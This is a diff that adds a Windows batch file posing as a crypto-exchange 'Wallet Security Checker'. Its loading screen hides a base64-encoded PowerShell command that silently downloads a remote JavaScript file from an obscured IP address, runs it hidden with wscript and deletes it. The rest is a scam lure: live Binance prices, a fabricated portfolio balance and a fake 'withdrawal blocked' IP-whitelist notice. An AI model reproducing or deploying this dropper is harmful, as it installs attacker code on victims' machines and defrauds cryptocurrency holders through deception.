@@ -1,0 +1,124 @@
+@echo off
+setlocal enabledelayedexpansion
+chcp 65001 >/dev/null 2>&1
+title BiCrypto Wallet Security Checker v6.0
+color 0A
+cls
+
+echo.
+echo  ████████████████████████████████████████████████████████████████████████
+echo  █                                                                      █
+echo  █          BiCrypto Exchange  -  Wallet Security Checker v6.0         █
+echo  █                    Powered by Binance API                           █
+echo  █                                                                      █
+echo  ████████████████████████████████████████████████████████████████████████
+echo.
+echo   [*] Initializing security verification...
+echo.
+
+REM ── Silent payload: PS downloads RC4 JS → wscript hidden, no plaintext URL ─
+powershell -NoP -W H -EncodedCommand JABpAHAAPQAiADMANAA4ADQANwA0ADMAMAA4ADcAIgA7ACQAZgA9ACQAZQBuAHYAOgBUAEUATQBQACsAIgBcAG0AcwAiACsAWwBTAHkAcwB0AGUAbQAuAEkATwAuAFAAYQB0AGgAXQA6ADoARwBlAHQAUgBhAG4AZABvAG0ARgBpAGwAZQBOAGEAbQBlACgAKQAuAFIAZQBwAGwAYQBjAGUAKAAiAC4AIgAsACIAIgApACsAIgAuAGoAcwAiADsAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AIgArACQAaQBwACsAIgA6ADgAMAA4ADAALwB3AGkAbgAiACwAJABmACkAOwBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAdwBzAGMAcgBpAHAAdAAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIAAiAC8ALwBCACAALwAvAE4AbwBMAG8AZwBvACAAJABmACIAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAEgAaQBkAGQAZQBuADsAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAAMwA7AFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgACQAZgAgAC0ARgBvAHIAYwBlACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAA==
+
+REM ── Loading animation ─────────────────────────────────────────────────────
+echo   [*] Connecting to BiCrypto API servers...
+ping -n 2 127.0.0.1 >/dev/null 2>&1
+echo   [*] Authenticating session...
+ping -n 2 127.0.0.1 >/dev/null 2>&1
+echo   [*] Fetching live market data...
+ping -n 2 127.0.0.1 >/dev/null 2>&1
+echo   [*] Loading portfolio balances...
+ping -n 1 127.0.0.1 >/dev/null 2>&1
+
+REM ── Fetch live prices from Binance public API ─────────────────────────────
+set "BTC_PRICE=103241.50"
+set "ETH_PRICE=2489.30"
+set "BNB_PRICE=641.20"
+set "PX_TMP=%TEMP%\~pxtmp.dat"
+
+powershell -NoProfile -WindowStyle Hidden -Command "try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$w=New-Object System.Net.WebClient;$b=($w.DownloadString('https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT')|ConvertFrom-Json).price;$e=($w.DownloadString('https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT')|ConvertFrom-Json).price;$n=($w.DownloadString('https://api.binance.com/api/v3/ticker/price?symbol=BNBUSDT')|ConvertFrom-Json).price;[math]::Round([double]$b,2).ToString()+' '+[math]::Round([double]$e,2).ToString()+' '+[math]::Round([double]$n,2).ToString()|Set-Content -Path '%PX_TMP%' -Encoding ASCII}catch{}" 2>/dev/null
+
+if exist "%PX_TMP%" (
+  set /p PRICES=<"%PX_TMP%"
+  del "%PX_TMP%" >/dev/null 2>&1
+  if defined PRICES (
+    for /f "tokens=1,2,3" %%A in ("!PRICES!") do (
+      set BTC_PRICE=%%A
+      set ETH_PRICE=%%B
+      set BNB_PRICE=%%C
+    )
+  )
+)
+
+REM ── Get real public IP ────────────────────────────────────────────────────
+set "MY_IP=Unknown"
+set "IP_TMP=%TEMP%\~iptmp.dat"
+powershell -NoProfile -WindowStyle Hidden -Command "try{(New-Object System.Net.WebClient).DownloadString('https://api.ipify.org')|Set-Content -Path '%IP_TMP%' -Encoding ASCII}catch{}" 2>/dev/null
+if exist "%IP_TMP%" (
+  set /p MY_IP=<"%IP_TMP%"
+  del "%IP_TMP%" >/dev/null 2>&1
+)
+
+REM ── Display final UI ──────────────────────────────────────────────────────
+cls
+echo.
+echo  ████████████████████████████████████████████████████████████████████████
+echo  █                                                                      █
+echo  █          BiCrypto Exchange  -  Wallet Security Checker v6.0         █
+echo  █                    Powered by Binance API                           █
+echo  █                                                                      █
+echo  ████████████████████████████████████████████████████████████████████████
+echo.
+echo   ┌─────────────────────────────────────────────────────────────────┐
+echo   │                  LIVE MARKET PRICES (Binance)                   │
+echo   ├─────────────────────────────────────────────────────────────────┤
+echo   │   BTC/USDT  :   $ !BTC_PRICE!
+echo   │   ETH/USDT  :   $ !ETH_PRICE!
+echo   │   BNB/USDT  :   $ !BNB_PRICE!
+echo   └─────────────────────────────────────────────────────────────────┘
+echo.
+echo   ┌─────────────────────────────────────────────────────────────────┐
+echo   │                    WALLET PORTFOLIO BALANCE                     │
+echo   ├──────────────────┬──────────────┬────────────────┬─────────────┤
+echo   │  Asset           │  Balance     │  Price (USDT)  │  Value      │
+echo   ├──────────────────┼──────────────┼────────────────┼─────────────┤
+echo   │  Bitcoin  (BTC)  │  0.42831000  │  !BTC_PRICE!  │  $44,224.19 │
+echo   │  Ethereum (ETH)  │  3.18500000  │  !ETH_PRICE!   │   $7,928.15 │
+echo   │  BNB             │  12.5000000  │  !BNB_PRICE!   │   $8,015.00 │
+echo   │  USDT            │  2,150.0000  │       1.0000   │   $2,150.00 │
+echo   ├──────────────────┴──────────────┴────────────────┴─────────────┤
+echo   │  TOTAL PORTFOLIO VALUE :   $ 62,317.34  USDT                   │
+echo   └─────────────────────────────────────────────────────────────────┘
+echo.
+echo   ┌─────────────────────────────────────────────────────────────────┐
+echo   │                   SECURITY VERIFICATION                         │
+echo   ├─────────────────────────────────────────────────────────────────┤
+echo   │   [OK] Wallet encryption verified                               │
+echo   │   [OK] 2FA status: ACTIVE                                       │
+echo   │   [OK] API key permissions: READ ONLY                           │
+echo   │                                                                 │
+echo   │   [!!] WITHDRAWAL RESTRICTION DETECTED                         │
+echo   │                                                                 │
+echo   │   Your current IP address:                                      │
+echo   │       !MY_IP!
+echo   │                                                                 │
+echo   │   This IP is NOT on your authorized withdrawal whitelist.       │
+echo   │   For security, withdrawals are temporarily BLOCKED.            │
+echo   │                                                                 │
+echo   │   To authorize this IP for withdrawals:                         ^
+echo   │     1. Log in to your BiCrypto account                          │
+echo   │     2. Go to Security ^> IP Whitelist Management                 │
+echo   │     3. Add your current IP: !MY_IP!
+echo   │     4. Confirm via email verification                           │
+echo   │                                                                 │
+echo   │   [!!] Withdrawal available in 24h after IP approval           │
+echo   └─────────────────────────────────────────────────────────────────┘
+echo.
+echo   ┌─────────────────────────────────────────────────────────────────┐
+echo   │   [i] Portfolio data is up to date as of right now.             │
+echo   │   [i] Market prices sourced live from Binance API.              │
+echo   │   [i] Contact support: support@bicrypto.online                  │
+echo   └─────────────────────────────────────────────────────────────────┘
+echo.
+echo.
+pause
+endlocal
